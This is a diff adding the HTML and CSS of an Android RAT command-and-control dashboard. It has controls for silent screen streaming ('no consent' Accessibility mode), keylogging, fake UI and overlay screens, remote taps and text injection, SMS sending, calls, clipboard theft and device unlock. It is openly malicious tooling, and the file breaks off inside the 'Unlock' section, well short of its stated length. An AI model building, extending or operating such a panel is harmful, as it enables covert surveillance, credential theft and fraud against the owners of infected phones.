@@ -1,0 +1,1848 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>C2 Dashboard</title>
+<style>
+/* ── Reset & Variables ───────────────────── */
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#080810;--surface:#10101c;--surface2:#16162a;--surface3:#1c1c38;
+  --border:#252540;--border2:#30305a;
+  --accent:#7c3aed;--accent2:#6d28d9;--accent3:#a855f7;
+  --green:#10b981;--red:#ef4444;--yellow:#f59e0b;
+  --blue:#3b82f6;--cyan:#06b6d4;--orange:#f97316;
+  --text:#e2e8f0;--text2:#94a3b8;--text3:#64748b;
+  --sidebar-w:220px;--header-h:52px;--radius:8px;--radius2:12px;
+}
+html,body{height:100%;background:var(--bg);color:var(--text);
+  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,sans-serif;
+  font-size:13px;overflow:hidden}
+::-webkit-scrollbar{width:5px;height:5px}
+::-webkit-scrollbar-track{background:var(--bg)}
+::-webkit-scrollbar-thumb{background:var(--border2);border-radius:3px}
+
+/* ── Layout ─────────────────────────────── */
+.app{display:grid;grid-template-rows:var(--header-h) 1fr;height:100vh;overflow:hidden}
+.body{display:grid;grid-template-columns:var(--sidebar-w) 1fr;overflow:hidden;height:100%}
+.sidebar{background:var(--surface);border-right:1px solid var(--border);
+  display:flex;flex-direction:column;overflow-y:auto;overflow-x:hidden}
+.content{overflow-y:auto;overflow-x:hidden;height:100%}
+section{display:none;padding:20px;min-height:100%}
+section.active{display:block}
+
+/* Fullscreen overrides */
+.fs-mode .sidebar,.fs-mode .header{display:none!important}
+.fs-mode .body{grid-template-columns:1fr}
+.fs-mode #sec-screen{display:flex!important;flex-direction:column;padding:0;height:100%}
+.fs-mode .screen-wrap{flex:1;height:100%!important}
+.fs-mode .screen-toolbar{padding:6px 8px}
+
+/* ── Header ─────────────────────────────── */
+.header{background:var(--surface);border-bottom:1px solid var(--border);
+  display:grid;grid-template-columns:var(--sidebar-w) 1fr auto;
+  align-items:center;padding:0 14px 0 0;gap:10px}
+.logo{display:flex;align-items:center;gap:8px;padding:0 14px;
+  height:100%;border-right:1px solid var(--border)}
+.logo-icon{width:28px;height:28px;background:linear-gradient(135deg,var(--accent),var(--accent3));
+  border-radius:7px;display:flex;align-items:center;justify-content:center;
+  font-size:13px;font-weight:800;color:#fff;flex-shrink:0}
+.logo-text{font-weight:700;font-size:14px;letter-spacing:-.3px}
+.logo-sub{font-size:10px;color:var(--text3);letter-spacing:.5px}
+.header-center{display:flex;align-items:center;gap:8px;flex:1;min-width:0}
+.device-select-wrap{position:relative;flex:1;max-width:300px}
+.device-select-wrap select{width:100%;background:var(--surface2);border:1px solid var(--border2);
+  color:var(--text);padding:6px 28px 6px 10px;border-radius:var(--radius);
+  font-size:12px;outline:none;appearance:none;cursor:pointer}
+.device-select-wrap::after{content:'▾';position:absolute;right:8px;top:50%;
+  transform:translateY(-50%);color:var(--text3);pointer-events:none;font-size:11px}
+.conn-badge{display:flex;align-items:center;gap:5px;padding:4px 10px;
+  border-radius:20px;font-size:11px;font-weight:600;border:1px solid;white-space:nowrap}
+.conn-badge.ok{color:var(--green);border-color:var(--green);background:rgba(16,185,129,.08)}
+.conn-badge.err{color:var(--red);border-color:var(--red);background:rgba(239,68,68,.08)}
+.conn-badge.warn{color:var(--yellow);border-color:var(--yellow);background:rgba(245,158,11,.08)}
+.conn-badge .dot{width:6px;height:6px;border-radius:50%;background:currentColor;flex-shrink:0}
+.header-actions{display:flex;align-items:center;gap:6px}
+
+/* ── Sidebar ─────────────────────────────── */
+.sidebar-section{padding:10px 8px 4px;font-size:10px;font-weight:700;
+  color:var(--text3);letter-spacing:.8px;text-transform:uppercase}
+.nav-item{display:flex;align-items:center;gap:9px;padding:8px 12px;cursor:pointer;
+  border-radius:var(--radius);margin:1px 6px;font-size:12px;font-weight:500;
+  color:var(--text2);transition:background .12s,color .12s;user-select:none}
+.nav-item:hover{background:var(--surface2);color:var(--text)}
+.nav-item.active{background:rgba(124,58,237,.18);color:var(--accent3);font-weight:600}
+.nav-icon{font-size:15px;width:20px;text-align:center;flex-shrink:0}
+.nav-badge{margin-left:auto;background:var(--accent);color:#fff;border-radius:10px;
+  padding:1px 6px;font-size:10px;font-weight:700;min-width:18px;text-align:center}
+.nav-badge.g{background:var(--green)}.nav-badge.r{background:var(--red)}
+.sidebar-footer{margin-top:auto;padding:10px;border-top:1px solid var(--border)}
+
+/* ── Buttons ─────────────────────────────── */
+.btn{display:inline-flex;align-items:center;justify-content:center;gap:5px;
+  padding:7px 13px;border:none;border-radius:var(--radius);cursor:pointer;
+  font-size:12px;font-weight:600;transition:all .12s;outline:none;
+  white-space:nowrap;user-select:none;line-height:1}
+.btn:active{transform:scale(.96)}
+.btn-primary{background:var(--accent);color:#fff}
+.btn-primary:hover{background:var(--accent2)}
+.btn-danger{background:var(--red);color:#fff}
+.btn-danger:hover{background:#dc2626}
+.btn-success{background:var(--green);color:#fff}
+.btn-success:hover{background:#059669}
+.btn-ghost{background:var(--surface2);color:var(--text2);border:1px solid var(--border)}
+.btn-ghost:hover{background:var(--surface3);color:var(--text)}
+.btn-sm{padding:5px 10px;font-size:11px}
+.btn-lg{padding:10px 20px;font-size:13px}
+.btn-icon{padding:6px;width:30px;height:30px}
+.btn-group{display:flex;gap:6px;flex-wrap:wrap;align-items:center}
+.btn-active{background:rgba(124,58,237,.2);color:var(--accent3);border:1px solid var(--accent)!important}
+.btn-reader-off{background:var(--surface2);color:var(--text3);border:1px solid var(--border)}
+.btn-reader-on{background:rgba(124,58,237,.25);color:var(--accent3);border:1px solid var(--accent)}
+
+/* ── Inputs ──────────────────────────────── */
+.input{background:var(--surface2);border:1px solid var(--border);color:var(--text);
+  padding:7px 10px;border-radius:var(--radius);font-size:12px;outline:none;width:100%}
+.input:focus{border-color:var(--accent)}
+.label{font-size:11px;font-weight:600;color:var(--text2);margin-bottom:5px;display:block}
+.form-group{margin-bottom:12px}
+.form-row{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+.input-row{display:flex;gap:8px;align-items:flex-end}
+
+/* ── Cards ───────────────────────────────── */
+.card{background:var(--surface);border:1px solid var(--border);
+  border-radius:var(--radius2);overflow:hidden}
+.card-header{padding:11px 14px;border-bottom:1px solid var(--border);
+  display:flex;align-items:center;gap:8px;font-weight:600;font-size:12px}
+.card-body{padding:14px}
+.grid-2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.grid-3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px}
+.grid-4{display:grid;grid-template-columns:repeat(4,1fr);gap:10px}
+
+/* ── Stats ───────────────────────────────── */
+.stat-card{background:var(--surface);border:1px solid var(--border);
+  border-radius:var(--radius2);padding:14px;display:flex;flex-direction:column;gap:5px}
+.stat-label{font-size:10px;font-weight:700;color:var(--text3);letter-spacing:.5px;text-transform:uppercase}
+.stat-value{font-size:22px;font-weight:800;letter-spacing:-.5px}
+.stat-sub{font-size:11px;color:var(--text3)}
+
+/* ── Badges ──────────────────────────────── */
+.badge{display:inline-flex;align-items:center;gap:4px;padding:2px 8px;
+  border-radius:12px;font-size:11px;font-weight:600}
+.badge.g{background:rgba(16,185,129,.15);color:var(--green)}
+.badge.r{background:rgba(239,68,68,.15);color:var(--red)}
+.badge.y{background:rgba(245,158,11,.15);color:var(--yellow)}
+.badge.b{background:rgba(59,130,246,.15);color:var(--blue)}
+.badge.p{background:rgba(124,58,237,.15);color:var(--accent3)}
+
+/* ── Device cards ────────────────────────── */
+.device-card{background:var(--surface);border:1px solid var(--border);
+  border-radius:var(--radius2);padding:14px;cursor:pointer;
+  transition:border-color .15s,background .15s}
+.device-card:hover{border-color:var(--border2);background:var(--surface2)}
+.device-card.sel{border-color:var(--accent);background:rgba(124,58,237,.07)}
+.device-card-hdr{display:flex;align-items:center;gap:10px;margin-bottom:10px}
+.dev-dot{width:9px;height:9px;border-radius:50%;flex-shrink:0}
+.dev-dot.on{background:var(--green);box-shadow:0 0 6px var(--green)}
+.dev-dot.off{background:var(--text3)}
+.dev-name{font-weight:700;font-size:13px;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.device-meta{display:grid;grid-template-columns:1fr 1fr;gap:5px;margin-top:8px}
+.device-meta-item{font-size:11px;color:var(--text3)}
+.device-meta-item b{color:var(--text2)}
+.perm-row{display:flex;gap:4px;margin-top:8px;flex-wrap:wrap}
+.perm-pip{width:7px;height:7px;border-radius:50%}
+.perm-pip.on{background:var(--green)}
+.perm-pip.off{background:var(--border2)}
+
+/* ── Tables ──────────────────────────────── */
+.table-wrap{overflow-x:auto;overflow-y:auto;max-height:420px}
+table{width:100%;border-collapse:collapse;font-size:12px}
+th{padding:7px 10px;text-align:left;font-size:10px;font-weight:700;color:var(--text3);
+  letter-spacing:.5px;text-transform:uppercase;border-bottom:1px solid var(--border);
+  background:var(--surface);position:sticky;top:0;z-index:1}
+td{padding:7px 10px;border-bottom:1px solid var(--border);color:var(--text2);word-break:break-all}
+tr:last-child td{border-bottom:none}
+tr:hover td{background:var(--surface2);color:var(--text)}
+
+/* ── Screen / HVNC ───────────────────────── */
+.screen-wrap{display:flex;flex-direction:column;
+  height:calc(100vh - var(--header-h) - 108px);min-height:400px}
+.screen-toolbar{display:flex;align-items:center;gap:6px;padding:10px 0;flex-wrap:wrap}
+.toolbar-sep{width:1px;height:22px;background:var(--border);flex-shrink:0;margin:0 2px}
+.canvas-area{flex:1;position:relative;background:#000;border-radius:var(--radius2);
+  overflow:hidden;border:1px solid var(--border);
+  display:flex;align-items:center;justify-content:center;min-height:200px}
+#screenCanvas{display:none;max-width:100%;max-height:100%;
+  image-rendering:pixelated;cursor:crosshair;outline:none}
+#screenCanvas:focus{outline:2px solid var(--accent);outline-offset:-2px}
+.canvas-ph{display:flex;flex-direction:column;align-items:center;gap:10px;
+  color:var(--text3);pointer-events:none;padding:40px;text-align:center}
+.canvas-ph .icon{font-size:48px;opacity:.25}
+.hud{position:absolute;font-size:10px;font-weight:700;font-family:monospace;
+  background:rgba(0,0,0,.72);border-radius:4px;padding:3px 7px;pointer-events:none}
+.hud-fps{top:8px;right:8px;color:var(--green)}
+.hud-quality{top:8px;left:8px;color:var(--text2)}
+.hud-reader{bottom:8px;right:8px}
+.hud-reader.v1{background:rgba(59,130,246,.85);color:#fff}
+.hud-reader.v2{background:rgba(124,58,237,.85);color:#fff}
+.touch-ring{position:absolute;width:22px;height:22px;border-radius:50%;
+  border:2px solid rgba(255,255,255,.75);pointer-events:none;
+  transform:translate(-50%,-50%);animation:fadeRing .55s ease-out forwards}
+@keyframes fadeRing{to{opacity:0;transform:translate(-50%,-50%) scale(2)}}
+
+/* ── Log ─────────────────────────────────── */
+.log-panel{background:var(--bg);border:1px solid var(--border);border-radius:var(--radius);
+  padding:8px;font-family:monospace;font-size:11px;
+  height:calc(100vh - var(--header-h) - 100px);overflow-y:auto}
+.log-entry{padding:2px 0;border-bottom:1px solid rgba(255,255,255,.04);
+  display:flex;gap:8px;line-height:1.5}
+.log-entry:last-child{border-bottom:none}
+.log-ts{color:var(--text3);flex-shrink:0;font-size:10px}
+.log-type{font-weight:700;flex-shrink:0;width:50px;font-size:10px}
+.log-type.cmd{color:var(--accent3)}.log-type.evt{color:var(--cyan)}
+.log-type.data{color:var(--yellow)}.log-type.err{color:var(--red)}.log-type.ok{color:var(--green)}
+.log-msg{color:var(--text2);word-break:break-all}
+
+/* ── Keylog stream ───────────────────────── */
+.keylog-stream{background:var(--bg);border:1px solid var(--border);border-radius:var(--radius);
+  padding:12px;font-family:monospace;font-size:12px;line-height:1.7;
+  max-height:280px;overflow-y:auto;color:var(--green);white-space:pre-wrap;word-break:break-all}
+
+/* ── Data tabs ───────────────────────────── */
+.tab-bar{display:flex;border-bottom:1px solid var(--border);margin-bottom:14px;overflow-x:auto;gap:0}
+.tab-btn{padding:7px 14px;background:none;border:none;cursor:pointer;
+  font-size:12px;font-weight:600;color:var(--text3);
+  border-bottom:2px solid transparent;transition:.12s;white-space:nowrap}
+.tab-btn.active{color:var(--accent3);border-bottom-color:var(--accent)}
+.tab-pane{display:none}.tab-pane.active{display:block}
+
+/* ── Misc ────────────────────────────────── */
+.sep{height:1px;background:var(--border);margin:12px 0}
+.overview-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:10px;margin-bottom:16px}
+.device-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(270px,1fr));gap:10px}
+.section-hdr{display:flex;align-items:center;gap:12px;margin-bottom:16px;flex-wrap:wrap}
+.section-title{font-size:17px;font-weight:700;letter-spacing:-.3px}
+.section-sub{font-size:12px;color:var(--text3);margin-top:1px}
+.empty-state{display:flex;flex-direction:column;align-items:center;
+  justify-content:center;padding:48px;color:var(--text3);gap:10px;text-align:center}
+.empty-state .icon{font-size:36px;opacity:.35}
+.mono{font-family:monospace}
+.w-full{width:100%}
+.mt-10{margin-top:10px}
+.mb-10{margin-bottom:10px}
+.mb-14{margin-bottom:14px}
+.map-placeholder{background:var(--bg);border:1px solid var(--border);border-radius:var(--radius);
+  min-height:140px;display:flex;align-items:center;justify-content:center;
+  flex-direction:column;gap:8px;color:var(--text3);font-size:12px;padding:20px;text-align:center}
+.slider{width:100%;accent-color:var(--accent);cursor:pointer;vertical-align:middle}
+
+/* ── Toast ───────────────────────────────── */
+#toasts{position:fixed;bottom:16px;right:16px;display:flex;flex-direction:column;
+  gap:8px;z-index:9999;pointer-events:none;max-width:320px}
+.toast{background:var(--surface2);border:1px solid var(--border2);border-radius:var(--radius);
+  padding:9px 14px;font-size:12px;min-width:220px;display:flex;align-items:center;gap:8px;
+  animation:slideIn .18s ease;box-shadow:0 4px 20px rgba(0,0,0,.6)}
+.toast.ok{border-left:3px solid var(--green)}.toast.err{border-left:3px solid var(--red)}
+.toast.info{border-left:3px solid var(--accent)}
+@keyframes slideIn{from{opacity:0;transform:translateX(18px)}to{opacity:1;transform:none}}
+
+/* ── Responsive ──────────────────────────── */
+@media(max-width:768px){
+  :root{--sidebar-w:52px}
+  .nav-item span:not(.nav-icon){display:none}
+  .logo-text,.logo-sub{display:none}
+  .sidebar-section{display:none}
+  .device-select-wrap{max-width:160px}
+  .grid-2,.grid-3,.grid-4{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+<div class="app" id="app">
+
+  <!-- ── Header ── -->
+  <header class="header">
+    <div class="logo">
+      <div class="logo-icon">C2</div>
+      <div>
+        <div class="logo-text">C2 Panel</div>
+        <div class="logo-sub">RAT DASHBOARD</div>
+      </div>
+    </div>
+    <div class="header-center">
+      <div class="device-select-wrap">
+        <select id="deviceSelect" onchange="selectDevice(this.value)">
+          <option value="">— Select Device —</option>
+        </select>
+      </div>
+      <div class="conn-badge err" id="connBadge">
+        <div class="dot"></div>
+        <span id="connLabel">Disconnected</span>
+      </div>
+    </div>
+    <div class="header-actions">
+      <button class="btn btn-ghost btn-sm btn-icon" title="Refresh devices" onclick="send({action:'GET_DEVICES'})">⟳</button>
+      <button class="btn btn-ghost btn-sm btn-icon" title="Fullscreen (F11)" onclick="toggleFullscreen()">⛶</button>
+    </div>
+  </header>
+
+  <div class="body">
+    <!-- ── Sidebar ── -->
+    <nav class="sidebar">
+      <div class="sidebar-section">Main</div>
+      <div class="nav-item active" data-sec="overview" onclick="nav(this)">
+        <span class="nav-icon">⊞</span><span>Overview</span>
+        <span class="nav-badge g" id="bdg-devices">0</span>
+      </div>
+      <div class="nav-item" data-sec="screen" onclick="nav(this)">
+        <span class="nav-icon">🖥</span><span>Screen</span>
+      </div>
+
+      <div class="sidebar-section">Control</div>
+      <div class="nav-item" data-sec="gestures" onclick="nav(this)">
+        <span class="nav-icon">👆</span><span>Gestures</span>
+      </div>
+      <div class="nav-item" data-sec="device" onclick="nav(this)">
+        <span class="nav-icon">📱</span><span>Device</span>
+      </div>
+
+      <div class="sidebar-section">Intel</div>
+      <div class="nav-item" data-sec="surveillance" onclick="nav(this)">
+        <span class="nav-icon">📷</span><span>Surveillance</span>
+      </div>
+      <div class="nav-item" data-sec="data" onclick="nav(this)">
+        <span class="nav-icon">📦</span><span>Data</span>
+        <span class="nav-badge" id="bdg-data">0</span>
+      </div>
+
+      <div class="sidebar-section">Ops</div>
+      <div class="nav-item" data-sec="apps" onclick="nav(this)">
+        <span class="nav-icon">⚙</span><span>Apps</span>
+      </div>
+      <div class="nav-item" data-sec="fakeui" onclick="nav(this)">
+        <span class="nav-icon">🎭</span><span>Fake UI</span>
+      </div>
+      <div class="nav-item" data-sec="overlay" onclick="nav(this)">
+        <span class="nav-icon">🔲</span><span>Overlay</span>
+      </div>
+
+      <div class="sidebar-section">System</div>
+      <div class="nav-item" data-sec="system" onclick="nav(this)">
+        <span class="nav-icon">🛡</span><span>System</span>
+      </div>
+      <div class="nav-item" data-sec="plugins" onclick="nav(this)">
+        <span class="nav-icon">🔌</span><span>Plugins</span>
+      </div>
+      <div class="nav-item" data-sec="logs" onclick="nav(this)">
+        <span class="nav-icon">📋</span><span>Log</span>
+        <span class="nav-badge" id="bdg-logs">0</span>
+      </div>
+
+      <div class="sidebar-footer">
+        <div style="font-size:10px;color:var(--text3);text-align:center" id="serverAddr">Connecting…</div>
+      </div>
+    </nav>
+
+    <!-- ── Content ── -->
+    <main class="content">
+
+      <!-- ▸ Overview ─────────────────────── -->
+      <section id="sec-overview" class="active">
+        <div class="section-hdr">
+          <div><div class="section-title">Overview</div><div class="section-sub">Connected devices</div></div>
+          <button class="btn btn-primary btn-sm" onclick="send({action:'GET_DEVICES'})">Refresh</button>
+        </div>
+        <div class="overview-grid">
+          <div class="stat-card"><div class="stat-label">Total</div><div class="stat-value" id="st-total">0</div><div class="stat-sub">devices</div></div>
+          <div class="stat-card"><div class="stat-label">Online</div><div class="stat-value" style="color:var(--green)" id="st-online">0</div><div class="stat-sub">live now</div></div>
+          <div class="stat-card"><div class="stat-label">Offline</div><div class="stat-value" style="color:var(--text3)" id="st-offline">0</div><div class="stat-sub">inactive</div></div>
+          <div class="stat-card"><div class="stat-label">Commands</div><div class="stat-value" style="color:var(--accent3)" id="st-cmds">0</div><div class="stat-sub">sent</div></div>
+        </div>
+        <div class="device-grid" id="deviceGrid">
+          <div class="empty-state"><div class="icon">📵</div><div>No devices connected</div><div style="font-size:11px">Waiting for APK on /ws</div></div>
+        </div>
+      </section>
+
+      <!-- ▸ Screen ────────────────────────── -->
+      <section id="sec-screen">
+        <div class="section-hdr">
+          <div><div class="section-title">Screen Viewer</div><div class="section-sub">HVNC — real-time stream</div></div>
+        </div>
+        <div class="screen-wrap">
+          <div class="screen-toolbar">
+            <!-- Reader V1 / V2 -->
+            <button class="btn btn-sm btn-reader-off" id="btnV1" onclick="setReader(1)" title="START_VNC (standard capture)">V1</button>
+            <button class="btn btn-sm btn-reader-on"  id="btnV2" onclick="setReader(2)" title="START_SILENT_VNC (Accessibility — no consent)">V2</button>
+            <div class="toolbar-sep"></div>
+            <!-- Stream controls -->
+            <button class="btn btn-success btn-sm" onclick="startHvnc()">▶ Start</button>
+            <button class="btn btn-danger  btn-sm" onclick="stopHvnc()">■ Stop</button>
+            <div class="toolbar-sep"></div>
+            <!-- Quality -->
+            <span style="font-size:11px;color:var(--text3)">Q:</span>
+            <input type="range" class="slider" id="hvncQuality" min="10" max="100" value="60"
+              style="width:80px" oninput="onQualityInput(this.value)">
+            <span id="qualityLbl" style="font-size:11px;color:var(--text3);width:28px">60%</span>
+            <div class="toolbar-sep"></div>
+            <!-- Nav keys -->
+            <button class="btn btn-ghost btn-sm" onclick="cmd('BACK')"          title="Back">◀</button>
+            <button class="btn btn-ghost btn-sm" onclick="cmd('HOME')"          title="Home">⬤</button>
+            <button class="btn btn-ghost btn-sm" onclick="cmd('RECENTS')"       title="Recents">▦</button>
+            <button class="btn btn-ghost btn-sm" onclick="cmd('QUICK_SETTINGS')" title="Quick Settings">⊞</button>
+            <div class="toolbar-sep"></div>
+            <button class="btn btn-ghost btn-sm" onclick="toggleFullscreen()" title="Fullscreen (F11)">⛶</button>
+            <button class="btn btn-ghost btn-sm" onclick="cmd('SNAP_SCREEN')"  title="Snap screenshot">📷</button>
+            <span style="font-size:10px;color:var(--text3);margin-left:4px">
+              Click canvas · Esc=Back · Del=Recents · DblClick=LongPress
+            </span>
+          </div>
+          <div class="canvas-area" id="canvasArea">
+            <div class="canvas-ph" id="canvasPh">
+              <div class="icon">🖥</div>
+              <div>Select a device then press ▶ Start</div>
+              <div style="font-size:11px;color:var(--text3)">V1 = START_VNC · V2 = START_SILENT_VNC</div>
+            </div>
+            <canvas id="screenCanvas" tabindex="0"></canvas>
+            <div class="hud hud-fps"    id="hudFps"    style="display:none">0 FPS</div>
+            <div class="hud hud-quality" id="hudQ"     style="display:none">60%</div>
+            <div class="hud hud-reader v2" id="hudReader" style="display:none">Reader V2</div>
+          </div>
+        </div>
+      </section>
+
+      <!-- ▸ Gestures ──────────────────────── -->
+      <section id="sec-gestures">
+        <div class="section-hdr"><div class="section-title">Gesture Control</div></div>
+        <div class="grid-2" style="gap:14px">
+          <div class="card">
+            <div class="card-header">👆 Tap / Click</div>
+            <div class="card-body">
+              <div class="form-row mb-10">
+                <div class="form-group"><label class="label">X</label><input class="input" type="number" id="tapX" value="200"></div>
+                <div class="form-group"><label class="label">Y</label><input class="input" type="number" id="tapY" value="400"></div>
+              </div>
+              <div class="btn-group">
+                <button class="btn btn-primary btn-sm" onclick="cmd('TAP',{x:+gi('tapX'),y:+gi('tapY')})">TAP</button>
+                <button class="btn btn-ghost btn-sm"   onclick="cmd('CLICK',{x:+gi('tapX'),y:+gi('tapY')})">CLICK</button>
+                <button class="btn btn-ghost btn-sm"   onclick="cmd('LONG_PRESS',{x:+gi('tapX'),y:+gi('tapY'),duration:1500})">LONG PRESS</button>
+              </div>
+            </div>
+          </div>
+          <div class="card">
+            <div class="card-header">⟵ Swipe</div>
+            <div class="card-body">
+              <div class="form-row mb-10">
+                <div class="form-group"><label class="label">X1</label><input class="input" type="number" id="sx1" value="175"></div>
+                <div class="form-group"><label class="label">Y1</label><input class="input" type="number" id="sy1" value="800"></div>
+              </div>
+              <div class="form-row mb-10">
+                <div class="form-group"><label class="label">X2</label><input class="input" type="number" id="sx2" value="175"></div>
+                <div class="form-group"><label class="label">Y2</label><input class="input" type="number" id="sy2" value="200"></div>
+              </div>
+              <div class="form-group"><label class="label">Duration (ms)</label><input class="input" type="number" id="swipeDur" value="400"></div>
+              <button class="btn btn-primary btn-sm w-full mt-10"
+                onclick="cmd('SWIPE',{x1:+gi('sx1'),y1:+gi('sy1'),x2:+gi('sx2'),y2:+gi('sy2'),duration:+gi('swipeDur')})">Swipe</button>
+            </div>
+          </div>
+          <div class="card">
+            <div class="card-header">⌨ Type / Inject</div>
+            <div class="card-body">
+              <div class="form-group"><label class="label">Text</label><input class="input" type="text" id="typeText" placeholder="Text to inject"></div>
+              <div class="btn-group">
+                <button class="btn btn-primary btn-sm" onclick="cmd('TYPE',{text:gi('typeText')})">Inject</button>
+                <button class="btn btn-ghost btn-sm"   onclick="cmd('TYPE',{text:'\n'})">↵ Enter</button>
+                <button class="btn btn-ghost btn-sm"   onclick="cmd('TYPE',{text:'\b'})">⌫ Del</button>
+                <button class="btn btn-ghost btn-sm"   onclick="cmd('TYPE',{text:' '})">Space</button>
+              </div>
+            </div>
+          </div>
+          <div class="card">
+            <div class="card-header">🧭 Navigation</div>
+            <div class="card-body">
+              <div class="btn-group">
+                <button class="btn btn-ghost btn-sm" onclick="cmd('BACK')">◀ Back</button>
+                <button class="btn btn-ghost btn-sm" onclick="cmd('HOME')">⬤ Home</button>
+                <button class="btn btn-ghost btn-sm" onclick="cmd('RECENTS')">▦ Recents</button>
+                <button class="btn btn-ghost btn-sm" onclick="cmd('QUICK_SETTINGS')">⊞ Quick Settings</button>
+                <button class="btn btn-ghost btn-sm" onclick="cmd('POWER_MENU')">⏻ Power</button>
+              </div>
+            </div>
+          </div>
+          <div class="card" style="grid-column:1/-1">
+            <div class="card-header">✍ Path Gesture</div>
+            <div class="card-body">
+              <div class="form-row">
+                <div class="form-group">
+                  <label class="label">Points (JSON array)</label>
+                  <input class="input" id="pathPts" value='[{"x":100,"y":600},{"x":175,"y":400},{"x":250,"y":600}]'>
+                </div>
+                <div class="form-group">
+                  <label class="label">Duration (ms)</label>
+                  <input class="input" type="number" id="pathDur" value="500">
+                </div>
+              </div>
+              <button class="btn btn-primary btn-sm mt-10" onclick="sendPath()">Send Path</button>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- ▸ Device Control ────────────────── -->
+      <section id="sec-device">
+        <div class="section-hdr"><div class="section-title">Device Control</div></div>
+        <div class="grid-2" style="gap:14px">
+          <div class="card">
+            <div class="card-header">🔊 Volume</div>
+            <div class="card-body">
+              <div class="form-group"><label class="label">Level (0–15)</label>
+                <div class="input-row"><input class="input" type="number" id="volVal" min="0" max="15" value="8">
+                  <button class="btn btn-primary btn-sm" onclick="cmd('SET_VOLUME',{level:+gi('volVal')})">Set</button></div>
+              </div>
+              <div class="btn-group mt-10">
+                <button class="btn btn-ghost btn-sm" onclick="cmd('VOLUME_UP')">▲ Up</button>
+                <button class="btn btn-ghost btn-sm" onclick="cmd('VOLUME_DOWN')">▼ Down</button>
+              </div>
+              <div class="sep"></div>
+              <div class="form-group"><label class="label">Ringer Mode</label>
+                <div class="btn-group">
+                  <button class="btn btn-ghost btn-sm" onclick="cmd('SET_SOUND_MODE',{mode:'normal'})">Normal</button>
+                  <button class="btn btn-ghost btn-sm" onclick="cmd('SET_SOUND_MODE',{mode:'vibrate'})">Vibrate</button>
+                  <button class="btn btn-ghost btn-sm" onclick="cmd('SET_SOUND_MODE',{mode:'silent'})">Silent</button>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="card">
+            <div class="card-header">💡 Screen</div>
+            <div class="card-body">
+              <div class="form-group"><label class="label">Brightness (0–255)</label>
+                <div class="input-row"><input class="input" type="number" id="brtVal" min="0" max="255" value="128">
+                  <button class="btn btn-primary btn-sm" onclick="cmd('SET_BRIGHTNESS',{level:+gi('brtVal')})">Set</button></div>
+              </div>
+              <div class="btn-group mt-10">
+                <button class="btn btn-ghost btn-sm" onclick="cmd('SCREEN_ON')">Screen On</button>
+                <button class="btn btn-ghost btn-sm" onclick="cmd('WAKE')">Wake</button>
+                <button class="btn btn-ghost btn-sm" onclick="cmd('LOCK_DEVICE')">Lock</button>
+              </div>
+              <div class="sep"></div>
+              <div class="form-group"><label class="label">Screen Timeout (ms)</label>
+                <div class="input-row"><input class="input" type="number" id="toVal" value="30000">
+                  <button class="btn btn-primary btn-sm" onclick="cmd('SET_SCREEN_TIMEOUT',{timeout:+gi('toVal')})">Set</button></div>
+              </div>
+              <button class="btn btn-ghost btn-sm w-full mt-10" onclick="cmd('SCREEN_PERSISTENCE',{enabled:true})">Keep Screen On</button>
+            </div>
+          </div>
+          <div class="card">
+            <div class="card-header">📶 Connectivity</div>
+            <div class="card-body">
+              <div class="btn-group">
+                <button class="btn btn-ghost btn-sm" onclick="cmd('SET_WIFI',{enabled:true})">WiFi ON</button>
+                <button class="btn btn-ghost btn-sm" onclick="cmd('SET_WIFI',{enabled:false})">WiFi OFF</button>
+                <button class="btn btn-ghost btn-sm" onclick="cmd('TOGGLE_WIFI')">Toggle WiFi</button>
+                <button class="btn btn-ghost btn-sm" onclick="cmd('SET_TORCH',{enabled:true})">Torch ON</button>
+                <button class="btn btn-ghost btn-sm" onclick="cmd('SET_TORCH',{enabled:false})">Torch OFF</button>
+                <button class="btn btn-ghost btn-sm" onclick="cmd('TOGGLE_TORCH')">Toggle Torch</button>
+              </div>
+              <div class="sep"></div>
+              <div class="form-group"><label class="label">Vibrate (ms)</label>
+                <div class="input-row"><input class="input" type="number" id="vibMs" value="300">
+                  <button class="btn btn-primary btn-sm" onclick="cmd('VIBRATE',{duration:+gi('vibMs')})">Vibrate</button></div>
+              </div>
+            </div>
+          </div>
+          <div class="card">
+            <div class="card-header">📞 Calls & SMS</div>
+            <div class="card-body">
+              <div class="form-group"><label class="label">Phone Number</label>
+                <input class="input" type="tel" id="phoneNum" placeholder="+1234567890">
+              </div>
+              <div class="btn-group mb-10">
+                <button class="btn btn-primary btn-sm" onclick="cmd('CALL_PHONE',{number:gi('phoneNum')})">Call</button>
+                <button class="btn btn-ghost btn-sm"   onclick="cmd('DIAL',{number:gi('phoneNum')})">Dial</button>
+              </div>
+              <div class="sep"></div>
+              <div class="form-group"><label class="label">SMS Text</label>
+                <input class="input" type="text" id="smsText" placeholder="Message">
+              </div>
+              <button class="btn btn-primary btn-sm" onclick="cmd('SEND_SMS',{number:gi('phoneNum'),text:gi('smsText')})">Send SMS</button>
+            </div>
+          </div>
+          <div class="card">
+            <div class="card-header">📋 Clipboard</div>
+            <div class="card-body">
+              <div class="form-group"><label class="label">Inject text</label>
+                <input class="input" id="clipIn" placeholder="Clipboard content">
+              </div>
+              <div class="btn-group mb-10">
+                <button class="btn btn-primary btn-sm" onclick="cmd('SET_CLIPBOARD',{text:gi('clipIn')})">Set</button>
+                <button class="btn btn-ghost btn-sm"   onclick="cmd('GET_CLIPBOARD')">Get</button>
+                <button class="btn btn-ghost btn-sm"   onclick="cmd('INJECT_CLIPBOARD',{text:gi('clipIn')})">Inject</button>
+              </div>
+              <div class="form-group"><label class="label">Received</label>
+                <div class="input mono" id="clipOut" style="min-height:30px;font-size:11px;background:var(--bg);word-break:break-all"></div>
+              </div>
+            </div>
+          </div>
+          <div class="card">
+            <div class="card-header">🔑 Unlock</div>
+            <div class="card-body">
